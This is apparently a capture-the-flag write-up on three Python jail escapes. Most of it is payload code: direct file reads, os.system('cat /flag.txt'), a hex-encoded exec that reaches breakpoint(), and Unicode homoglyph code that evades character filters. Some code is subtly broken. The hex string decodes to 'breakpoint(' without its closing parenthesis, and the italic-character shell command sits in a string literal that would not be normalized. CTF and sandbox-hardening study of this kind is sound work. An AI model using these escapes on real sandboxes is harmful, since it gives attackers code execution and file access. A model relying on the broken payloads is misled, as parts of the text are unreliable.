---
title: "Python Jailbreak Techniques"
date: "2025-06-25"
---

Three levels of escalation for escaping Python jails, from a completely
unrestricted sandbox to one that bans every alphanumeric character.

## 1. Baby Jail

**Scenario**: No restrictions, simplest bypass

**Solutions**:

```python
open("/flag.txt").read()
```

```python
__import__('os').system("cat /flag.txt")
```

## 2. Bahri Jail

**Scenario**: Basic character restrictions

**Solution**: Hex-encoded `breakpoint()`

```python
exec(bytes.fromhex('627265616b706f696e7428'))  # breakpoint()
```

Then in the debugger:

```python
import os; os.system("cat /flag.txt")
```

## 3. Silent Jail

**Scenario**: All alphanumerics banned (A-Z, a-z, 0-9)

**Solution**: Unicode homoglyph attack

```python
𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()  # breakpoint() using mathematical sans-serif italic
```

Then in the debugger:

```python
𝘪𝘮𝘱𝘰𝘳𝘵 𝘰𝘴; 𝘰𝘴.𝘴𝘺𝘴𝘵𝘦𝘮("𝘤𝘢𝘵 /𝘧𝘭𝘢𝘨.𝘵𝘹𝘵")
```

## Key Notes

- `breakpoint()` is the universal starting point
- Unicode chars bypass character filters but execute normally
- Hex/bytes encoding bypasses string-based filters
